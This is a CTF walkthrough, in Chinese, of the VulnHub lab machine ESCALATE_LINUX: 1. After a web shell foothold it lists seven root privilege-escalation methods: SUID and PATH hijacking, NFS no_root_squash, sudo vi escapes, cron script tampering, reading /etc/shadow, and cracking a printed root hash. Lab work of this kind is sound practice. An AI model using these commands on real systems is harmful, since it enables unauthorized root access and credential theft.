# ESCALATE_LINUX: 1

2024-7-27 https://www.vulnhub.com/entry/escalate_linux-1,323/

difficulty: easy

## IP

192.168.5.37

## Scan

Open Port -> 80,111,139,445,2049,40825,41391,43945,46303

```
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
```

先看 80 首页无内容，gobuster 扫描出 http://192.168.5.37/shell.php , 提示 cmd 作为参数，ls 可以命令执行，在 kali 上获得反弹的 shell。

suid： /home/user5/script 和 /home/user3/shell

## 方式 1

/home/user3/shell 中调用了 /home/user5/.script.sh 脚本，脚本中有 bash -i：

直接得到了 root 权限：

```
cd /home/user3
./shell
```

## 方式 2

/home/user5/script 调用了 user5 目录中的 ls 程序，未使用绝对路径。

```
cd /tmp
echo 'bash -p' > ls
chmod +x ls
export PATH=/tmp:$PATH
/home/user5/script
```

## 方式 3

/etc/exports 中/home/user5 (rw,no_root_squash) 在 kali 上切换到 root 用户，su root && mkdir -p /tmp/mount && mount -o rw,vers=3 192.168.5.37:/home/user5 /tmp/mount

切换到/tmp/mount 中，echo '/bin/bash -p' > rootsh && chmod +x rootsh 在目标机器上，进入到/home/user5 目录中，就看到了这个 suid 脚本，执行后就得到了 root 权限。

## 方式 4

mysql 弱密码 root/root，user 数据库中有 user_info 表，内容为 mysql:mysql@12345, su mysql 用户，切换到家目录中，发现备份文件.user_informations，赋予 r 权限后，读取内容：

```
user2:user2@12345
user3:user3@12345
user4:user4@12345
user5:user5@12345
user6:user6@12345
user7:user7@12345
user8:user8@12345
```

其中 user8 中 sudo 有 /usr/bin/vi， 可以直接提升至 root : sudo vi -c ':!/bin/sh' /dev/null

## 方式 5

/etc/crontab 中有/home/user4/Desktop/autoscript.sh 每 5 分钟执行一次。使用方式 4 中获得的 user4 的密码 user4@12345，切换到 user 用户。编辑/home/user4/Desktop/autoscript.sh，添加: cp /bin/bash /home/user4/rootbash;chmod +xs /home/user4/rootbash , 等待 5 分钟 /home/user4/rootbash -p 获得 root 权限(不能写到/tmp 中)。

## 方式 6

user2 的 sudo 显示(user1) ALL ，根据方式 4 中发现的密码方式，猜测 user1 的密码可能是 user1@12345。尝试读取 shadow 文件 sudo -u user1 sudo cat /etc/shadow 输入密码 user1@12345 成功。同时发现 user1 的 sudo 为 (ALL : ALL) ALL 具有全部方式，sudo bash 就可以获得 root 权限。

## 方式 7

将方式 6 中获得的 shadow 中的 root 使用 rockyou 进行破解，发现密码为 12345

```
root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::
```
